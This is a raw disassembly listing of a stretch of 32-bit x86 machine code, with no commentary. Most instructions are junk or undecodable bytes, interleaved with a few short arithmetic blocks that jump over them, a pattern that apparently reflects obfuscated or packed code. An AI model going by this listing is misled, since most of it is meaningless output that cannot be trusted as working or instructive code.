  4093d7:	and    bl,BYTE PTR [ebp+0x3c]
  4093da:	mov    edx,0x545217f6
  4093df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4093e0:	sbb    BYTE PTR gs:[ebx+0x2c449744],al
  4093e7:	xchg   BYTE PTR [eax],ch
  4093e9:	mov    WORD PTR [ebx+0x6a],?
  4093ec:	add    eax,0xd7cb8190
  4093f1:	mov    bl,0x71
  4093f3:	pop    ss
  4093f4:	sbb    bh,bl
  4093f6:	and    esi,DWORD PTR [esi]
  4093f8:	dec    edi
  4093f9:	fadd   QWORD PTR [edx+0x28618fa2]
  4093ff:	jmp    0xdd74d85c
  409404:	sbb    DWORD PTR fs:[ecx],edx
  409407:	loope  0x40938d
  409409:	dec    esp
  40940a:	xchg   edi,ebp
  40940c:	xor    ecx,esi
  40940e:	mov    edi,0xb4510155
  409413:	(bad)  
  409414:	inc    ecx
  409415:	cmp    esp,esi
  409417:	mov    esp,0x31e8ef7f
  40941c:	cmp    ecx,DWORD PTR [edi]
  40941e:	scas   eax,DWORD PTR es:[edi]
  40941f:	xlat   BYTE PTR ds:[ebx]
  409420:	jmp    0x409634
  409425:	clc    
  409426:	icebp  
  409427:	mov    esp,0xb8b16984
  40942c:	icebp  
  40942d:	ficomp DWORD PTR [edx-0x7dfce013]
  409433:	jno    0x40944c
  409435:	(bad)  
  409436:	fdiv   DWORD PTR [eax+0x70]
  409439:	imul   edi,DWORD PTR [edi+0x70],0xa5748970
  409440:	test   al,0x85
  409442:	sbb    ebx,DWORD PTR ds:0xa1ec0879
  409448:	mov    eax,ds:0xfe8b4eb3
  40944d:	retf   0x48f1
  409450:	imul   ebx,ebp,0x3f
  409453:	adc    edx,esi
  409455:	jecxz  0x40948a
  409457:	xor    edi,DWORD PTR [ebx]
  409459:	add    al,BYTE PTR [edi+0x24262b11]
  40945f:	ds xchg esp,eax
  409461:	gs retf 
  409463:	dec    esi
  409464:	aad    0x5f
  409466:	repz out 0x17,al
  409469:	dec    ebx
  40946a:	cld    
  40946b:	bound  ecx,QWORD PTR [ebp-0x77]
  40946e:	dec    ebp
  40946f:	jne    0x40941f
  409471:	jno    0x40944d
  409473:	add    eax,eax
  409475:	jno    0x409469
  409477:	(bad)  [edx]
  409479:	cdq    
  40947a:	cmp    eax,0xdf722bff
  40947f:	or     al,BYTE PTR [ecx+0x40]
  409482:	xchg   esi,eax
  409483:	add    eax,DWORD PTR [ecx]
  409485:	fs gs mov dl,0xc2
  409489:	mov    ds:0x896d492b,al
  40948e:	pop    edi
  40948f:	aam    0xef
  409491:	add    al,0x5c
  409493:	jo     0x4094f9
  409495:	js     0x40947c
  409497:	mov    eax,0xf6a7a932
  40949c:	sbb    ch,BYTE PTR [ebp+edx*1-0x58]
  4094a0:	imul   esp,eax,0x796cc2f5
  4094a6:	sti    
  4094a7:	dec    esi
  4094a8:	test   DWORD PTR ds:0x899c3e3e,0xc060d59a
  4094b2:	sti    
  4094b3:	mov    WORD PTR [ebp-0xc],ss
  4094b6:	lods   eax,DWORD PTR ds:[esi]
  4094b7:	pop    ebx
  4094b8:	dec    edi
  4094b9:	fs jns 0x4094f6
  4094bc:	outs   dx,BYTE PTR ds:[esi]
  4094bd:	enter  0x6aa3,0xc4
  4094c1:	xchg   ebx,eax
  4094c2:	xchg   eax,esp
  4094c4:	mul    DWORD PTR [ebx-0x5adfd50e]
  4094ca:	xor    BYTE PTR [esi+0x12734e0f],0xfb
  4094d1:	add    BYTE PTR [esi],bh
  4094d3:	nop
  4094d4:	mov    ds:0x93cad127,eax
  4094d9:	xchg   DWORD PTR [ebx+ebp*4+0x29852686],ecx
  4094e0:	xchg   ebx,eax
  4094e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4094e2:	repnz cmp eax,0xef0536a0
  4094e9:	ins    DWORD PTR es:[edi],dx
  4094ea:	pop    ecx
  4094eb:	outs   dx,DWORD PTR ds:[esi]
  4094ec:	xchg   edi,eax
  4094ed:	in     eax,dx
  4094ee:	xor    dl,BYTE PTR [ebx+edx*2]
  4094f1:	daa    
  4094f2:	or     DWORD PTR [edx+ebp*8-0x7a],eax
  4094f6:	ss jbe 0x4094ec
  4094f9:	jbe    0x409543
  4094fb:	sbb    bh,BYTE PTR [eax+edx*2+0x2fc1e01c]
  409502:	inc    esi
  409503:	ins    DWORD PTR es:[edi],dx
  409504:	cmp    ch,BYTE PTR [esi]
  409506:	and    ch,cl
  409508:	ds clc 
  40950a:	hlt    
  40950b:	jae    0x409509
  40950d:	or     eax,0xe783ea82
  409512:	push   es
  409513:	jp     0x409550
  409515:	pop    eax
  409516:	aam    0x93
  409518:	sbb    esp,DWORD PTR [eax+0x7e187a24]
  40951e:	dec    ecx
  40951f:	cld    
  409520:	out    0xcf,eax
  409522:	cmc    
  409523:	mov    eax,0x12aef7be
  409528:	xchg   esi,eax
  409529:	dec    ebx
  40952a:	enter  0x1fc6,0x58
  40952e:	fild   DWORD PTR [esi-0x9]
  409531:	jne    0x4095a3
  409533:	and    edi,DWORD PTR [esp+ebp*1-0x83dc863]
  40953a:	stos   DWORD PTR es:[edi],eax
  40953b:	inc    eax
  40953c:	cmp    al,0xe0
  40953e:	jge    0x40954c
  409540:	dec    ebx
  409541:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409542:	data16 (bad) 
  409544:	test   DWORD PTR [ebx],0x23c5725d
  40954a:	je     0x40952a
  40954c:	call   0x2091:0x9f5f5058
  409553:	ja     0x40958b
  409555:	daa    
  409556:	outs   dx,DWORD PTR ds:[esi]
  409557:	dec    ecx
  409558:	les    ebp,FWORD PTR [ecx-0x746c7dae]
  40955e:	sub    BYTE PTR [edx],bh
  409560:	aaa    
  409561:	mov    WORD PTR [bx+di],?
  409564:	lea    ebx,[ebp+eiz*2+0x3235379]
  40956b:	(bad)  [edi+0x28]
  40956e:	or     DWORD PTR [ebp+0x1794bd31],ebx
  409574:	dec    eax
  409575:	mov    esp,0xc3efc3ca
  40957a:	and    ah,BYTE PTR [ebp-0x5d]
  40957d:	push   ebx
  40957e:	pop    ds
  40957f:	ret    
  409580:	xchg   esp,eax
  409581:	and    eax,0xebb66c63
  409586:	test   al,0xeb
  409588:	push   edx
  409589:	ins    DWORD PTR es:[edi],dx
  40958a:	sub    DWORD PTR [edx+0x1296dd79],esp
  409590:	leave  
  409591:	cmp    eax,0xbfa3faf8
  409596:	in     eax,dx
  409597:	add    al,0xe8
  409599:	(bad)  
  40959a:	frstor [eax+0x363bc65a]
  4095a0:	mov    ecx,0x4d82cd
  4095a5:	xchg   edi,eax
  4095a6:	mov    al,0xf3
  4095a8:	xor    cl,BYTE PTR [ecx]
  4095aa:	dec    ebp
  4095ab:	dec    esi
  4095ac:	gs scas eax,DWORD PTR es:[edi]
  4095ae:	dec    edi
  4095af:	pop    ebp
  4095b0:	test   al,0xb3
  4095b2:	cld    
  4095b3:	jp     0x409620
  4095b5:	stc    
  4095b6:	fisubr WORD PTR [esi-0x8d45160]
  4095bc:	adc    ecx,DWORD PTR [ecx]
  4095be:	sbb    edx,edx
  4095c0:	push   ebp
  4095c1:	repz (bad)
  4095c4:	jl     0x4095d8
  4095c6:	mov    edi,0xb2934668
  4095cb:	or     cl,BYTE PTR [ebx-0x45]
  4095ce:	cmp    esp,DWORD PTR [esi]
  4095d0:	fldenv [ebx-0xf4370d9]
  4095d6:	jbe    0x4095ef
  4095d8:	or     eax,0x42e68cff
  4095dd:	pop    esi
  4095de:	lea    ebp,[ebp+0x61]
  4095e1:	ins    DWORD PTR es:[edi],dx
  4095e2:	lea    ebp,[ecx+0x68]
  4095e5:	mov    eax,ds:0xa839792f
  4095ea:	int    0x5a
  4095ec:	pop    ss
  4095ed:	leave  
  4095ee:	scas   eax,DWORD PTR es:[edi]
  4095ef:	mov    bl,BYTE PTR [esi]
  4095f1:	inc    ebp
  4095f2:	inc    edx
  4095f3:	sub    bl,BYTE PTR ds:[edi-0x5a]
  4095f7:	shl    esp,0x75
  4095fa:	aad    0x35
  4095fc:	and    al,0x5
  4095fe:	sub    al,0x22
  409600:	inc    edi
  409601:	or     ebx,DWORD PTR [ebx-0x7c1a49a3]
  409607:	mov    ds,WORD PTR [ebp-0x25]
  40960a:	loopne 0x409677
  40960c:	jbe    0x4095cc
  40960e:	mov    ss,WORD PTR [edi+0x3b]
  409611:	test   esi,esp
  409613:	inc    eax
  409614:	je     0x40964b
  409616:	pop    ecx
  409617:	dec    esp
  409618:	mov    ah,0x8d
  40961a:	hlt    
  40961b:	js     0x1c6cdee8
  409621:	jno    0x40963d
  409623:	add    bl,bh
  409625:	test   bh,0xb9
  409628:	inc    ebp
  409629:	jno    0x409617
  40962b:	inc    esi
  40962c:	inc    ebp
  40962e:	imul   esi,DWORD PTR [edx-0x6f],0x384fedf
  409635:	push   ebp
  409636:	in     al,dx
  409637:	mov    DWORD PTR [ebp-0x14],edx
  40963a:	mov    edx,DWORD PTR [ebp-0xc]
  40963d:	mov    edi,DWORD PTR [ebp-0x24]
  409640:	xor    edx,eax
  409642:	jmp    0x409856
  409647:	dec    ebp
  409648:	iret   
  409649:	lods   eax,DWORD PTR ds:[esi]
  40964a:	dec    ebx
  40964b:	lods   eax,DWORD PTR ds:[esi]
  40964c:	imul   ebp,DWORD PTR [ecx-0x37],0x8e1037e1
  409653:	cld    
  409654:	fnstsw WORD PTR [edi+0x70e6f779]
  40965a:	jo     0x4096c5
  40965c:	jg     0x4096ce
  40965e:	jo     0x40968d
  409660:	les    edx,FWORD PTR [ebx+0x13]
  409663:	adc    al,0x91
  409665:	mov    dh,0xb
  409667:	out    dx,al
  409668:	xchg   ecx,eax
  409669:	fwait
  40966a:	imul   BYTE PTR [esi+0x48668d7c]
  409670:	fisubr DWORD PTR ds:0x86cf276a
  409676:	dec    ebp
  409677:	adc    BYTE PTR [edi-0x13],al
  40967a:	push   ebp
  40967b:	dec    ebx
  40967c:	(bad)  
  40967d:	cld    
  40967e:	dec    ebp
  40967f:	inc    esi
  409680:	mov    ds:0x365054a0,al
  409685:	das    
  409686:	(bad)  
  409687:	xor    al,0x8a
  409689:	jl     0x409628
  40968b:	mov    edi,0x483120de
  409690:	xor    al,0x47
  409692:	outs   dx,DWORD PTR ds:[esi]
  409693:	sbb    DWORD PTR [esi-0x74],0xffffff90
  409697:	mov    DWORD PTR [eax+ebx*1],ecx
  40969a:	pop    edx
  40969b:	ins    DWORD PTR es:[edi],dx
  40969c:	push   ecx
  40969d:	inc    ecx
  40969e:	xchg   ebx,eax
  40969f:	pop    edx
  4096a0:	xor    eax,0x8f199179
  4096a5:	and    DWORD PTR [ecx+eax*4],0xa413605f
  4096ac:	jle    0x409681
  4096ae:	and    dl,ch
  4096b0:	ja     0x4096a3
  4096b2:	test   DWORD PTR [esi+ebp*8+0x45],ebx
  4096b6:	fwait
  4096b7:	mov    ah,0xa9
  4096b9:	jns    0x409661
  4096bb:	lock out dx,al
  4096bd:	push   0xffffffa4
  4096bf:	ret    
  4096c0:	mov    bl,0x88
  4096c2:	mov    al,0x8f
  4096c4:	adc    eax,esi
  4096c6:	pop    ss
  4096c7:	push   ss
  4096c8:	dec    ecx
  4096c9:	lds    edi,FWORD PTR [esi+0x7c]
  4096cc:	pop    edx
  4096cd:	push   ss
  4096ce:	scas   al,BYTE PTR es:[edi]
  4096cf:	mov    ah,0x7d
  4096d1:	or     eax,0x288f6842
  4096d6:	sub    al,BYTE PTR [eax-0x7988ff39]
  4096dc:	ret    
  4096dd:	mov    ah,0x95
  4096df:	loop   0x409690
  4096e1:	xor    BYTE PTR [ecx],ch
  4096e3:	fild   QWORD PTR [ebp-0x4]
  4096e6:	dec    ebx
  4096e7:	mov    ecx,0x2077aed9
  4096ec:	xlat   BYTE PTR ds:[ebx]
  4096ed:	jp     0x4096a0
  4096ef:	retf   0xd72f
  4096f2:	push   es
  4096f3:	sar    DWORD PTR [ebx+edi*4],1
  4096f6:	push   esp
  4096f7:	pop    es
  4096f8:	loopne 0x4096b0
  4096fa:	dec    eax
  4096fb:	aam    0x23
  4096fd:	retf   
  4096fe:	stc    
  4096ff:	jmp    0x69caac7e
  409704:	push   0xffffffe2
  409706:	mov    edx,0xd59c3e1
  40970b:	pop    eax
  40970c:	adc    ebx,esp
  40970e:	xor    DWORD PTR [ecx+0x771dd4bd],0xffffffd6
  409715:	xor    edx,DWORD PTR [edx]
  409717:	add    al,0xc
  409719:	ret    
  40971a:	push   ecx
  40971b:	xor    ch,BYTE PTR [ecx]
  40971d:	int3   
  40971e:	loopne 0x409784
  409720:	sbb    DWORD PTR [eax-0x26],0xa02a6bb0
  409727:	pushf  
  409728:	repz sbb bh,BYTE PTR [esp+0x1]
  40972d:	js     0x409786
  40972f:	ins    BYTE PTR es:[edi],dx
  409730:	ss (bad) 
  409732:	js     0x409781
  409734:	cmp    al,dh
  409736:	outs   dx,DWORD PTR ds:[esi]
  409737:	mov    esp,DWORD PTR [edi]
  409739:	std    
  40973a:	jmp    FWORD PTR [edi+eax*1+0x7b]
  40973e:	outs   dx,DWORD PTR ds:[esi]
  40973f:	and    edi,DWORD PTR [ebx]
  409741:	inc    esp
  409742:	fstp   TBYTE PTR [edx-0x2d]
  409745:	ror    dl,1
  409747:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409748:	adc    ch,ch
  40974a:	fist   WORD PTR [ebx]
  40974c:	in     eax,dx
  40974d:	sub    al,0xbe
  40974f:	lods   al,BYTE PTR ds:[esi]
  409750:	jmp    0xd0ea:0xc8c54b7c
  409757:	sub    cl,ch
  409759:	ja     0x409744
  40975b:	stos   DWORD PTR es:[edi],eax
  40975c:	xchg   ebp,eax
  40975d:	push   ecx
  40975e:	mov    ds:0x9c523de4,al
  409763:	cmp    eax,0x3f62b1ad
  409768:	arpl   WORD PTR [ecx-0x59d01621],cx
  40976e:	in     eax,0x98
  409770:	stos   BYTE PTR es:[edi],al
  409771:	imul   BYTE PTR [ecx+0x7]
  409774:	ret    
  409775:	lods   eax,DWORD PTR ds:[esi]
  409776:	push   ds
  409777:	adc    al,0x99
  409779:	inc    edi
  40977a:	rcr    BYTE PTR ds:[edi],cl
  40977d:	sub    eax,0xc25344de
  409782:	mov    WORD PTR [ebx-0x3aa7ecc9],ds
  409788:	out    0xc6,al
  40978a:	xchg   DWORD PTR [ebp+0x7e],eax
  40978d:	outs   dx,BYTE PTR ds:[esi]
  40978e:	stos   DWORD PTR es:[edi],eax
  40978f:	push   0x7e
  409791:	xchg   ecx,eax
  409792:	aad    0xba
  409794:	sub    BYTE PTR [eax+0x4b],0x6d
  409798:	push   0xffffff8c
  40979a:	fwait
  40979b:	cmc    
  40979c:	repz int 0xbb
  40979f:	fild   QWORD PTR [edx-0x799a6c0c]
  4097a5:	jo     0x4097de
  4097a7:	(bad)  
  4097a9:	enter  0x8904,0xf0
  4097ad:	inc    ebx
  4097ae:	mov    edx,0xc2781df5
  4097b3:	sbb    al,0xe3
  4097b5:	adc    ebp,edx
  4097b7:	sub    al,0x8d
  4097b9:	xlat   BYTE PTR ds:[ebx]
  4097ba:	mov    al,ds:0x69b220e8
  4097bf:	scas   eax,DWORD PTR es:[edi]
  4097c0:	mov    bh,0x96
  4097c2:	adc    bh,BYTE PTR [ebx+0x52]
  4097c5:	xchg   ecx,eax
  4097c6:	sbb    al,0x96
  4097c8:	mov    edi,0x8df5ccbf
  4097cd:	mov    ecx,0xbac522e3
  4097d2:	fld    TBYTE PTR ds:0x5cde61d6
  4097d8:	(bad)  
  4097d9:	mov    al,0x8c
  4097db:	pop    eax
  4097dc:	xchg   esp,eax
  4097dd:	xchg   esp,eax
  4097de:	es aaa 
  4097e0:	inc    ebx
  4097e1:	lods   al,BYTE PTR ds:[esi]
  4097e2:	loop   0x4097af
  4097e4:	pop    eax
  4097e5:	adc    esp,eax
  4097e7:	ins    DWORD PTR es:[edi],dx
  4097e8:	mov    ch,0xfd
  4097ea:	pop    eax
  4097eb:	xchg   edx,eax
  4097ec:	mov    eax,ds:0xd9dfda5c
  4097f1:	adc    edx,DWORD PTR [ecx+ecx*2-0x1c943e5c]
  4097f8:	jl     0x40984d
  4097fa:	sbb    BYTE PTR [ecx+0x2746366c],0x41
  409801:	and    ebp,0xfa601821
  409807:	jg     0x409876
  409809:	je     0x409887
  40980b:	in     al,dx
  40980c:	adc    DWORD PTR [ecx-0x73],ecx
  40980f:	sub    al,BYTE PTR [ebp+0x40]
  409812:	stos   BYTE PTR es:[edi],al
  409813:	push   0xffffffe8
  409815:	lahf   
  409816:	xor    al,0xb8
  409818:	mov    es,ebx
  40981a:	shl    BYTE PTR [edi-0x31db28fd],0x26
  409821:	ret    0x5545
  409824:	das    
  409825:	pop    edi
  409826:	ds pop ebx
  409828:	sbb    eax,0x7c2aa02c
  40982d:	or     DWORD PTR [edx],edx
  40982f:	sbb    al,BYTE PTR [eax+0x63c45c4a]
  409835:	add    eax,DWORD PTR [ecx]
  409837:	xlat   BYTE PTR ds:[ebx]
  409838:	add    DWORD PTR ds:0x357ff9f9,ebx
  40983e:	xchg   DWORD PTR [edx],ecx
  409840:	ins    DWORD PTR es:[edi],dx
  409841:	mov    cl,0x4c
  409843:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409844:	or     eax,0x4e534712
  409849:	xor    eax,0x34eb019c
  40984e:	mov    ecx,0x850af944
  409853:	and    bh,BYTE PTR [edi+0xfd10364]
  409859:	scas   eax,DWORD PTR es:[edi]
  40985a:	xlat   BYTE PTR ds:[ebx]
  40985b:	mov    edi,DWORD PTR [ebp-0xc]
  40985e:	xor    edi,eax
  409860:	sub    edx,edi
  409862:	mov    edi,DWORD PTR [ebp-0xc]
  409865:	mov    ebx,DWORD PTR [ebp-0x14]
  409868:	xor    edi,eax
  40986a:	add    edi,ecx
  40986c:	imul   edi,ebx
  40986f:	mov    ebx,DWORD PTR [ebp-0x18]
  409872:	xor    ebx,eax
  409874:	sub    edx,ecx
  409876:	lea    edi,[edi+ebx*1+0x32729c]
  40987d:	cmp    edi,edx
  40987f:	jbe    0x408b6b
  409885:	mov    edx,DWORD PTR [ebp-0xc]
  409888:	jmp    0x409a9c
  40988d:	int3   
  40988e:	sub    eax,0xbde9be20
  409893:	push   0xffffffa9
  409895:	mov    ebp,0x67bf628
  40989a:	test   al,0x66
  40989c:	call   0x7f69:0x7070e4e0
  4098a3:	jo     0x409915
  4098a5:	out    0xfe,eax
  4098a7:	sbb    al,0x84
  4098a9:	xor    al,0x6b
  4098ab:	sub    BYTE PTR [edx+0x52eb48c6],ah
  4098b1:	or     eax,0xc959d134
  4098b6:	pop    esp
  4098b7:	das    
  4098b8:	leave  
  4098b9:	cmp    edi,DWORD PTR [esi]
  4098bb:	xchg   di,ax
  4098bd:	xchg   edx,eax
  4098be:	retf   
  4098bf:	test   eax,0xe50e886
  4098c4:	test   DWORD PTR [ebx+0x38],eax
  4098c7:	dec    eax
  4098c8:	pop    edx
  4098c9:	jb     0x409894
  4098cb:	cmp    ch,BYTE PTR [ecx+0x112bc98d]
  4098d1:	div    edx
  4098d3:	inc    esp
  4098d4:	addr16 dec eax
  4098d6:	stos   BYTE PTR es:[edi],al
  4098d7:	sub    BYTE PTR [edi],cl
  4098d9:	cld    
  4098da:	jmp    0x2d2adf77
  4098df:	jmp    0x40993d
  4098e1:	xchg   DWORD PTR [ebx-0x2773597b],ebx
  4098e7:	jmp    ebp
  4098e9:	fstp   DWORD PTR [esi]
  4098eb:	dec    eax
  4098ec:	mov    eax,0x3a81ef98
  4098f1:	(bad)  
  4098f2:	aad    0xbd
  4098f4:	pop    es
  4098f5:	cs in  al,0x79
  4098f8:	scas   al,BYTE PTR es:[edi]
  4098f9:	xor    eax,0x2bb16834
  4098fe:	or     bh,ah
  409900:	mov    ch,0x6f
  409902:	dec    ecx
  409903:	jge    0x4098e5
  409905:	dec    esi
  409906:	push   ds
  409907:	mov    bh,0xf1
  409909:	fsub   DWORD PTR [edx+0x72]
  40990c:	dec    edi
  40990d:	out    0x3b,eax
  40990f:	mov    eax,ds:0x4b41d53b
  409914:	imul   ebp,DWORD PTR [esi],0xffffff86
  409917:	int3   
  409918:	aam    0xc2
  40991a:	xchg   edi,eax
  40991b:	mov    dh,0x8
  40991d:	arpl   WORD PTR [edx+edi*2+0xf],sp
  409921:	fwait
  409922:	mov    eax,0xcecaf593
  409927:	xlat   BYTE PTR ds:[ebx]
  409928:	(bad)  
  40992a:	fcomp  QWORD PTR [esi]
  40992c:	out    0x90,eax
  40992e:	or     DWORD PTR ds:0x9756875e,0x8592f3b4
  409938:	inc    edi
  409939:	jge    0x409938
  40993b:	mov    cl,0xd4
  40993d:	fmul   DWORD PTR [eax]
  40993f:	push   edx
  409940:	push   0xdb21d962
  409945:	js     0x409913
  409947:	cmp    dl,BYTE PTR [esi+eax*1]
  40994a:	mov    bh,0xf9
  40994c:	sub    BYTE PTR [eiz*1+0x86c2b39],bl
  409953:	xor    BYTE PTR [ebx],bl
  409955:	out    0x5a,eax
  409957:	ret    0x37af
  40995a:	mov    WORD PTR [ebx-0x1c742a5c],ss
  409960:	aas    
  409961:	shl    DWORD PTR [eax-0x3f4b0138],0x23
  409968:	dec    edx
  409969:	outs   dx,BYTE PTR ds:[esi]
  40996a:	lahf   
  40996b:	sub    al,BYTE PTR [eax]
  40996d:	inc    edi
  40996e:	mov    edi,0x353e30df
  409973:	out    0x57,al
  409975:	(bad)  
  409976:	daa    
  409977:	inc    ecx
  409978:	das    
  409979:	add    esi,ebp
  40997b:	stos   BYTE PTR es:[edi],al
  40997c:	mov    bh,0xad
  40997e:	out    dx,al
  40997f:	jo     0x4099ca
  409981:	sub    edi,DWORD PTR [esi+0x67]
  409984:	mov    fs,WORD PTR [esi]
  409986:	stc    
  409987:	mov    al,ds:0xdbb1cb32
  40998c:	stos   BYTE PTR es:[edi],al
  40998d:	aaa    
  40998e:	test   BYTE PTR [ecx+0x12],al
  409991:	retf   0xed18
  409994:	or     DWORD PTR [esi+eax*2+0x7c],esi
  409998:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409999:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40999a:	addr16 mov ds:0x3d0a,al
  40999e:	adc    esp,esp
  4099a0:	in     eax,dx
  4099a1:	dec    edx
  4099a2:	inc    ebx
  4099a3:	pusha  
  4099a4:	sub    al,ch
  4099a6:	add    al,BYTE PTR [ebx]
  4099a8:	call   0x41da:0x91f26b66
  4099af:	mov    dh,ah
  4099b1:	xlat   BYTE PTR ds:[ebx]
  4099b2:	int    0x93
  4099b4:	mov    eax,esi
  4099b6:	sub    cl,dh
  4099b8:	(bad)  
  4099ba:	and    BYTE PTR cs:[ecx-0x32],al
  4099be:	pop    edx
  4099bf:	icebp  
  4099c0:	jg     0x4099ad
  4099c2:	imul   esi,DWORD PTR [esi+0x2ebf60aa],0x58
  4099c9:	mov    al,ds:0x3474fa48
  4099ce:	xor    DWORD PTR es:[ebx+0x1491f087],ebx
  4099d5:	inc    edx
  4099d6:	cmc    
  4099d7:	and    al,0xaf
  4099d9:	js     0x1911a37
  4099df:	daa    
  4099e0:	jnp    0x409969
  4099e2:	frstor [edx-0x56]
  4099e5:	aad    0x7d
  4099e7:	lahf   
  4099e8:	aas    
  4099e9:	cli    
  4099ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4099eb:	aaa    
  4099ec:	shl    dh,1
  4099ee:	clc    
  4099ef:	loopne 0x4099e6
  4099f1:	push   esp
  4099f2:	and    ch,BYTE PTR [edi+0x4]
  4099f5:	jno    0x4099bd
  4099f7:	ror    DWORD PTR [edx+eax*2+0x5235f3ba],cl
  4099fe:	cmc    
  4099ff:	call   0xac9c:0x6e2d0f75
  409a06:	test   dh,0xb
  409a09:	stc    
  409a0a:	mov    ecx,0x91711ec8
  409a0f:	(bad)  
  409a10:	leave  
  409a11:	or     BYTE PTR [edi+0x13],ch
  409a14:	cmp    al,0xb6
  409a16:	mov    dh,0xf
  409a18:	fs gs movaps xmm4,xmm0
  409a1d:	add    BYTE PTR [esp+eiz*2-0x7c0bc63d],al
  409a24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409a25:	std    
  409a26:	js     0x409a87
  409a28:	icebp  
  409a29:	mov    BYTE PTR [edx],ch
  409a2b:	or     ebx,eax
  409a2d:	imul   DWORD PTR [eax-0x4f]
  409a30:	jo     0x409a72
  409a32:	mov    esi,edi
  409a34:	daa    
  409a35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409a36:	dec    edi
  409a37:	dec    ecx
  409a38:	or     DWORD PTR [ecx-0x75],ebp
  409a3b:	loope  0x409a0a
  409a3d:	lock mov bl,0xc7
  409a40:	repz sub DWORD PTR ds:0xb68dcd2e,ecx
  409a47:	xchg   DWORD PTR [edx+0x12f747aa],edi
  409a4d:	out    0xe2,al
  409a4f:	push   esi
  409a50:	mov    ss,WORD PTR [eax]
  409a52:	push   esp
  409a53:	push   edx
  409a54:	ins    DWORD PTR es:[edi],dx
  409a55:	outs   dx,DWORD PTR ds:[esi]
  409a56:	imul   BYTE PTR [edi-0x81b6b68]
  409a5c:	ret    0x2c39
  409a5f:	push   ecx
  409a60:	enter  0xfdab,0xb8
  409a64:	test   eax,0xfa45a176
  409a69:	lds    esi,FWORD PTR [ebp+edx*1+0x4c]
  409a6d:	inc    edx
  409a6e:	push   0xffffffef
  409a70:	adc    ebx,eax
  409a72:	jecxz  0x409a9c
  409a74:	repnz iret 
  409a76:	jbe    0x409a76
  409a78:	dec    ebp
  409a79:	jge    0x409ade
  409a7b:	mov    edi,0xb2ef030a
  409a80:	aaa    
  409a81:	sub    eax,0xb6822140
  409a86:	xor    ebp,esi
  409a88:	imul   edx,DWORD PTR [edx-0x78beadaa],0x1ded6861
  409a92:	dec    ecx
  409a94:	out    dx,eax
  409a95:	cld    
  409a96:	imul   edx,edx,0x3bf8867f
  409a9c:	mov    edi,DWORD PTR [ebp-0x24]
  409a9f:	xor    edx,eax
  409aa1:	add    edx,ecx
  409aa3:	imul   edx,edi
  409aa6:	mov    edi,DWORD PTR [ebp-0x18]
  409aa9:	xor    edi,eax
  409aab:	add    edx,edi
  409aad:	mov    edi,DWORD PTR [ebp-0x8]
  409ab0:	lea    edx,[edx+edi*1+0x32729c]
  409ab7:	mov    DWORD PTR [ebp-0x8],edx
  409aba:	mov    edx,DWORD PTR [ebp-0x20]
  409abd:	jmp    0x409cd1
  409ac2:	popa   
  409ac3:	ja     0x409abc
  409ac5:	add    esi,ecx
  409ac7:	xor    DWORD PTR [ecx+0x75],0xffffffde
  409acb:	adc    al,0xb4
  409acd:	mov    cl,BYTE PTR [edi+0x61]
  409ad0:	cmp    BYTE PTR [ecx-0x27],0xe2
  409ad4:	jo     0x409b46
  409ad6:	imul   edi,DWORD PTR [edi+0x70],0x2f865770
  409add:	xchg   edx,eax
  409ade:	popf   
  409adf:	rol    ebx,cl
  409ae1:	inc    ebx
  409ae2:	xlat   BYTE PTR ds:[ebx]
  409ae3:	pop    edi
  409ae4:	pop    esp
  409ae5:	dec    ebx
  409ae6:	pop    ecx
  409ae7:	xchg   ebx,eax
  409ae8:	cmp    cl,BYTE PTR [ecx+eax*2-0x3ed963dd]
  409aef:	sub    DWORD PTR [ebx+0x19db128f],ecx
  409af5:	add    BYTE PTR [ebp-0x4924c8fb],dh
  409afb:	in     al,0x72
  409afd:	xchg   ecx,eax
  409afe:	aas    
  409aff:	push   ds
  409b00:	xchg   esi,eax
  409b01:	test   al,0x7f
  409b03:	aas    
  409b04:	cdq    
  409b05:	inc    edx
  409b06:	jne    0x409adb
  409b08:	mov    WORD PTR [esi-0x3469214],ds
  409b0e:	test   DWORD PTR [edi+0x658b4810],0xbba637a6
  409b18:	sbb    ah,BYTE PTR [ebx-0x6d]
  409b1b:	jbe    0x409b92
  409b1d:	jg     0x409b45
  409b1f:	mov    esi,0xa0756ac6
  409b24:	dec    ebx
  409b25:	jmp    0x409b3f
  409b27:	adc    bl,BYTE PTR ds:0x387ba306
  409b2d:	jnp    0x409b4f
  409b2f:	into   
  409b30:	cmp    DWORD PTR [edi],ebp
  409b32:	(bad)  
  409b33:	pop    ds
  409b34:	in     eax,dx
  409b35:	sub    cl,al
  409b37:	inc    edi
  409b38:	(bad)  
  409b39:	jmp    0x9fbbacef
  409b3e:	jae    0x409b73
  409b40:	push   ebp
  409b41:	adc    BYTE PTR [ecx+edx*4],dl
  409b44:	cmp    edi,DWORD PTR [edi+0x5713f8df]
  409b4a:	retf   
  409b4b:	ret    
  409b4c:	and    BYTE PTR [ebp-0x7b],ah
  409b4f:	xor    DWORD PTR [ebp-0x1caf17d5],ecx
  409b55:	mov    ecx,0x3635cd1e
  409b5a:	jnp    0x409aeb
  409b5c:	pop    ds
  409b5d:	inc    BYTE PTR [edi-0x54]
  409b60:	ror    BYTE PTR [esi+eax*1],1
  409b63:	out    0x3b,eax
  409b65:	les    ebp,FWORD PTR [esp+esi*2+0x5b]
  409b69:	mov    WORD PTR [edi-0x63cdd00e],ss
  409b6f:	nop
  409b70:	mov    WORD PTR [eax+0x41],es
  409b73:	dec    esp
  409b74:	ja     0x409aff
  409b76:	int3   
  409b77:	enter  0x9e32,0xfb
  409b7b:	xchg   ebp,eax
  409b7c:	lock sbb al,0x5e
  409b7f:	jno    0x409bad
  409b81:	iret   
  409b82:	sahf   
  409b83:	stos   DWORD PTR es:[edi],eax
  409b84:	lds    ebx,FWORD PTR [ecx]
  409b86:	loope  0x409b5d
  409b88:	stos   DWORD PTR es:[edi],eax
  409b89:	pop    edx
  409b8a:	gs push ebp
  409b8c:	pop    ss
  409b8d:	jmp    0xc529:0x7dd41271
